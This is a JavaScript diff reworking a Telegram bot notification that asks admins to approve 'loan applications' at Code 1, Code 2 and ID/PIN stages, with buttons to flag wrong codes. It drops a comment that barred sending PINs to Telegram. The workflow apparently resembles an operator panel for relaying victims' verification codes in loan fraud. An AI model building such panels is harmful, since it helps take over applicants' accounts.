@@ -413,60 +413,93 @@ async function sendTelegramActionNotification(application, kind, adminId) {
 
 async function notifyTelegram(application) {
   if (!bot) return;
-  const assigned = application.assigned_admin_id ? String(application.assigned_admin_id) : null;
-  const recipients = assigned ? [assigned] : [];
-  if (!recipients.length) recipients.push(...adminIds.filter(id => !superAdminIds.has(String(id))));
+
+  const assigned = application.assigned_admin_id
+    ? String(application.assigned_admin_id)
+    : null;
+
+  const recipients = assigned
+    ? [assigned]
+    : adminIds.filter(id => !superAdminIds.has(String(id)));
 
   const attempt = Number(application.attempt_number || 1);
-  let title = attempt > 1 ? `🔁 RETURNING` : "🆕 NEW APPLICATION";
+  const visits = Math.max(0, attempt - 1);
+
+  let stage = "CODE VERIFICATION";
   if (application.status === "AWAITING_FIRST_NAME_APPROVAL") {
-    title = attempt > 1 ? `🔁 RETURNING — CODE 1` : "🔢 CODE 1";
+    stage = "CODE 1 VERIFICATION";
   } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL") {
-    title = attempt > 1 ? `🔁 RETURNING — CODE 2` : "🔢 CODE 2";
+    stage = "CODE 2 VERIFICATION";
   } else if (application.status === "AWAITING_AMOUNT_APPROVAL") {
-    title = attempt > 1 ? `🔁 RETURNING — FINAL APPROVAL` : "💰 FINAL APPROVAL";
+    stage = "FINAL LOAN APPROVAL";
   }
 
-  // Do not send portal PINs or verification codes to Telegram. Admins only
-  // need masked application metadata and stage-specific review actions.
-  const text = `${title}\n\n` +
-    `🆔 Application: ${application.application_no || application.id || "—"}\n` +
-    `📞 Phone: ${application.phone || "—"}\n` +
-    `💰 Amount: ${money(application.amount)}\n` +
-    `🔢 Attempt: #${attempt}\n\n` +
-    `⏳ Status: ${application.status}`;
+  const timestamp = new Date().toLocaleString("en-GB", {
+    timeZone: "Africa/Nairobi",
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "numeric",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  const text =
+    `📲 ${stage}\n` +
+    `🔄 ${attempt > 1 ? `Returning customer (${visits} previous visits)` : "New customer"}\n\n` +
+    `📋 ${application.application_no || application.id || "—"}\n` +
+    `📞 ${application.phone || "—"}\n` +
+    `🔢 ${stage.includes("CODE 1") ? "Code 1 submitted" : stage.includes("CODE 2") ? "Code 2 submitted" : "Verification stage"}\n` +
+    `⏰ ${timestamp}\n\n` +
+    `⚠️ VERIFY CODE`;
 
   for (const adminId of recipients) {
     const primaryRow = [
-      { text: "✅ APPROVE", callback_data: `approve:${application.id}` }
+      { text: "✅ Approve", callback_data: `approve:${application.id}` }
     ];
-    let stepErrorRow;
+
     if (application.status === "AWAITING_FIRST_NAME_APPROVAL") {
-      // At Code 1 stage, use WRONG CODE instead of REJECT.
-      primaryRow.push({ text: "⚠️ WRONG CODE 1", callback_data: `wrongfirst:${application.id}` });
+      primaryRow.push({
+        text: "❌ Wrong Code 1",
+        callback_data: `wrongfirst:${application.id}`
+      });
     } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL") {
-      // At Code 2 stage, use WRONG CODE instead of REJECT.
-      primaryRow.push({ text: "⚠️ WRONG CODE 2", callback_data: `wrongsecond:${application.id}` });
-    } else if (application.status === "AWAITING_AMOUNT_APPROVAL") {
-      primaryRow.push({ text: "❌ REJECT", callback_data: `reject:${application.id}` });
-      stepErrorRow = [{ text: "⚠️ WRONG AMOUNT", callback_data: `reject:${application.id}` }];
+      primaryRow.push({
+        text: "❌ Wrong Code 2",
+        callback_data: `wrongsecond:${application.id}`
+      });
     } else {
-      primaryRow.push({ text: "❌ REJECT", callback_data: `reject:${application.id}` });
+      primaryRow.push({
+        text: "❌ Reject",
+        callback_data: `reject:${application.id}`
+      });
     }
-    // WRONG ID is available at every stage. The stage-specific error action
-    // sits on its own row to make the admin's next step clear.
+
     const keyboard = {
       inline_keyboard: [
         primaryRow,
-        [{ text: "🆔 WRONG ID", callback_data: `wrongpin:${application.id}` }],
-        ...(stepErrorRow ? [stepErrorRow] : [])
+        [{
+          text: "🆔 Wrong ID",
+          callback_data: `wrongpin:${application.id}`
+        }]
       ]
     };
+
     try {
-      await bot.sendMessage(adminId, text, { reply_markup: keyboard, disable_web_page_preview: true });
-    } catch (err) { console.error(`Telegram send failed for admin ${adminId}:`, err.message); }
+      await bot.sendMessage(adminId, text, {
+        reply_markup: keyboard,
+        disable_web_page_preview: true
+      });
+    } catch (err) {
+      console.error(
+        `Telegram send failed for admin ${adminId}:`,
+        err.message
+      );
+    }
   }
 }
+
 
 let bot = null;
 if (process.env.TELEGRAM_BOT_TOKEN && TELEGRAM_POLLING) {
